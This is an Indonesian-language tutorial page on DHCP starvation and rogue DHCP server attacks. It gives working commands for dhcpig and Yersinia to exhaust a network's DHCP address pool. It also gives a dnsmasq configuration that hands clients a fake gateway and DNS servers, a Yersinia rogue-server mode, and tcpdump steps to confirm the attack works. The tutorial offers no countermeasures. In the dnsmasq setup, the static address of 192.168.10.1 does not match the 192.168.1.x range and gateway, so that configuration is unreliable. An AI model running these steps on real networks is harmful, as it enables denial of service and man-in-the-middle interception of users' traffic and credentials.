---
sidebar_position: 2
---

# DHCP Rogue

## Pengertian DHCP Rogue  
DHCP Rogue adalah server DHCP tidak sah yang berjalan di dalam jaringan dan memberikan alamat IP kepada perangkat yang terhubung. Server ini dapat dikonfigurasi oleh penyerang atau pengguna yang tidak menyadari dampaknya, menyebabkan gangguan jaringan dan serangan Man in the Middle (MITM).

![alt text](<images/dhcp rogue/image.png>)

**Cara Kerja DHCP Rogue**  
1. Penyerang mengaktifkan server DHCP tidak sah.
2. Server rogue merespons permintaan DHCP lebih cepat dari server resmi.
3. Perangkat klien menerima alamat IP dari server rogue dengan konfigurasi jaringan yang salah.
4. Penyerang dapat mengarahkan lalu lintas jaringan melalui perangkatnya untuk melakukan sniffing atau manipulasi data.

**Dampak DHCP Rogue**  
- Perangkat klien bisa mendapatkan alamat IP yang salah dan kehilangan akses ke jaringan.
- Penyerang dapat melakukan serangan MITM dengan mengarahkan lalu lintas melalui servernya.
- Risiko pencurian kredensial meningkat melalui serangan berbasis DNS spoofing.

**Kombinasi dengan DHCP Starvation**  
DHCP Rogue sering dikombinasikan dengan serangan DHCP Starvation. Penyerang pertama-tama menghabiskan seluruh alamat IP yang tersedia di server DHCP sah menggunakan DHCP Starvation, lalu mengaktifkan server DHCP Rogue untuk memberikan alamat IP kepada perangkat korban dengan konfigurasi berbahaya.

## 1. DHCP Starvation

### Pengertian dhcpig
`dhcpig` adalah tool open-source yang digunakan untuk melakukan serangan **DHCP Starvation**. Serangan ini bertujuan untuk menghabiskan semua alamat IP yang tersedia di server DHCP sehingga klien sah tidak dapat memperoleh alamat IP.

### Cara Kerja DHCP Starvation
- `dhcpig` mengirimkan banyak permintaan **DHCP Discover** dengan berbagai alamat MAC palsu.
- Server DHCP akan memberikan respon **DHCP Offer** untuk setiap permintaan yang diterima.
- Karena setiap permintaan berasal dari alamat MAC yang berbeda, server menganggapnya sebagai klien unik dan mengalokasikan IP baru untuk setiap permintaan.
- Akhirnya, pool alamat IP akan habis, menyebabkan klien sah gagal mendapatkan alamat IP.

### Contoh Perintah DHCP Starvation dengan dhcpig
Untuk menjalankan serangan dengan `dhcpig`, gunakan perintah berikut di sistem berbasis Linux:
```bash
sudo dhcpig -i eth0
```
- `-i eth0` menentukan antarmuka jaringan yang digunakan untuk serangan.

### Alternatif Lain untuk DHCP Starvation
Selain `dhcpig`, ada juga tool lain yang bisa digunakan untuk DHCP Starvation seperti:
- **Yersinia**: Tool untuk menyerang berbagai protokol jaringan, termasuk DHCP.
  ```bash
  sudo yersinia dhcp -attack 1
  ```
  (Attack 1 adalah mode starvation pada Yersinia)

## 2. DHCP Rogue
### a. dnsmasq
Untuk membuat DHCP Rogue menggunakan `dnsmasq`, ikuti langkah berikut:
```bash
sudo apt update && sudo apt install dnsmasq -y
```

#### Konfigurasi IP Statis
Sebelum mengaktifkan DHCP Rogue, pastikan antarmuka jaringan memiliki alamat IP statis:
```bash
sudo ip addr add 192.168.10.1/24 dev eth0
```
Atau gunakan `nmtui` (Network Manager Text User Interface) untuk mengatur IP:
```bash
nmtui
```
Ubah IP menjadi **192.168.10.1** pada antarmuka jaringan yang sesuai.

#### Konfigurasi dnsmasq
Edit file konfigurasi `dnsmasq`:
```bash
sudo nano /etc/dnsmasq.conf
```
Tambahkan atau ubah konfigurasi berikut:
```ini
interface=eth0  # Ganti dengan interface yang digunakan

dhcp-range=192.168.1.10,192.168.1.200,12h  # Rentang alamat IP untuk klien
dhcp-option=3,192.168.1.1  # Gateway palsu (bisa disesuaikan)
dhcp-option=6,8.8.8.8,8.8.4.4  # DNS palsu
```

Simpan file dan keluar, lalu restart layanan `dnsmasq`:
```bash
sudo systemctl restart dnsmasq
sudo systemctl enable dnsmasq
```

### b. Verifikasi DHCP Rogue
Periksa log untuk memastikan `dnsmasq` berjalan dengan benar:
```bash
sudo journalctl -u dnsmasq --no-pager | tail -n 20
```

Gunakan `tcpdump` untuk melihat trafik DHCP:
```bash
sudo tcpdump -i eth0 port 67 or port 68 -n
```
Jika berhasil, setelah pool DHCP asli habis, klien akan mulai mendapatkan alamat IP dari DHCP Rogue yang telah dibuat.
![alt text](<images/dhcp rogue/image-1.png>)
![alt text](<images/dhcp rogue/image-2.png>)

### Alternatif Lain untuk DHCP Server
Selain `dnsmasq`, ada beberapa opsi lain untuk membuat DHCP Server, seperti:
- **ISC DHCP Server**: DHCP server yang lebih kompleks dan memiliki banyak fitur tambahan.
  ```bash
  sudo apt install isc-dhcp-server -y
  ```

## 3. DHCP Rogue dengan Yersinia
Selain menggunakan `dnsmasq`, kita juga bisa menggunakan `Yersinia` untuk menjalankan DHCP Rogue.

### a. Instalasi Yersinia
Jika belum terinstal, pasang `Yersinia` terlebih dahulu:
```bash
sudo apt install yersinia -y
```

### b. Menjalankan Yersinia mode dhcp rogue
Untuk menjalankan DHCP Rogue menggunakan `Yersinia`, gunakan perintah berikut:
```bash
sudo yersinia dhcp -attack 2 -I eth0
```
- `-attack 2` adalah mode rogue DHCP server.
- `-I eth0` menentukan antarmuka jaringan yang digunakan.

Dengan menjalankan perintah ini, `Yersinia` akan mulai menawarkan alamat IP ke klien yang mencari server DHCP, membuatnya mendapatkan konfigurasi jaringan dari DHCP Rogue.

## Kesimpulan
- `dhcpig` dapat digunakan untuk serangan **DHCP Starvation** dengan cara menghabiskan IP pool pada server DHCP.
- `dnsmasq` dapat digunakan untuk membuat **DHCP Rogue** agar klien yang tidak mendapatkan IP dari DHCP asli tetap bisa mendapatkan IP.
- `Yersinia` juga bisa digunakan sebagai alternatif untuk menjalankan **DHCP Rogue**.
- Monitoring menggunakan `tcpdump` membantu dalam melihat trafik DHCP untuk memastikan keberhasilan serangan atau konfigurasi DHCP Rogue.

Dengan tutorial ini, diharapkan pengguna dapat memahami bagaimana DHCP Starvation dan DHCP Rogue bekerja serta bagaimana mengimplementasikannya menggunakan `dhcpig`, `dnsmasq`, dan `Yersinia`.